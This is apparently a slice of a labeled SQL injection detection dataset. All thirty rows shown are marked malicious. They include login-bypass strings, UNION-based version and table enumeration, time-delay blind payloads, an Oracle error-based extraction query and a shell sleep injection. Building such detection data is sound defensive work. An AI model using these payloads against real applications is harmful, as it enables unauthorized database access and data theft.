row_index,payload_norm,label,sqli_type_hint
60,or 2 between 1 and 3,1,
61,"select * from users where id = 1 or "" ) ."" = 1 or 1 = 1 -- 1",1,
62,"select * from users where id = 1 or 1#"". union select null,version ( ) -- 1",1,
63,admin' or '1' = '1,1,
64,; if not ( select system_user ) <> 'sa' waitfor delay '0:0:2' --,1,
65,"select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1",1,
66,""" or 0 = 0 --",1,
67,"select * from users where id = 1 union select @ $_,version ( ) -- 1",1,
68,select * from users where id = 1 <@.$ or 1 = 1 -- 1,1,
69,"select * from users where id = 1 or ""%."" or 1 = 1 -- 1",1,
70,"select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1",1,
71,"select * from users where id = 1 or "",."" or 1 = 1 -- 1",1,
72,char@39A+@SELECT,1,
73,"select * from users where id = 1 or ""1&"" or 1 = 1 -- 1",1,
74,admin' ) or ( '1' = '1,1,
75,declare @s varchar ( 200 ) select @s = 0x73656c6 ...,1,
76,"or 0 = 0 #""",1,
77,"select * from users where id = 1 or "".]"" or 1 = 1 -- 1",1,
78,) or ( 'x' = 'x,1,
79,"select * from users where id = 1.<@$ union select 1,version ( ) -- 1",1,
80,$ ( sleep 50 ),1,
81,"select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1",1,
82,"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --",1,
83,"select * from users where id = 1 or 1#"". union select 'a',version ( ) -- 1",1,
84,"select * from users where id = 1 or 1#""; union select null,version ( ) -- 1",1,
85,"select * from users where id = 1 or 1#""? or 1 = 1 -- 1",1,
86,"""a"""" or 1 = 1--""",1,
87,"select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1",1,
88,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 4 ) ) AND 'i' = 'i",1,
89,"select * from users where id = '1' union select ( \ ) ,@@VERSION -- 1'",1,
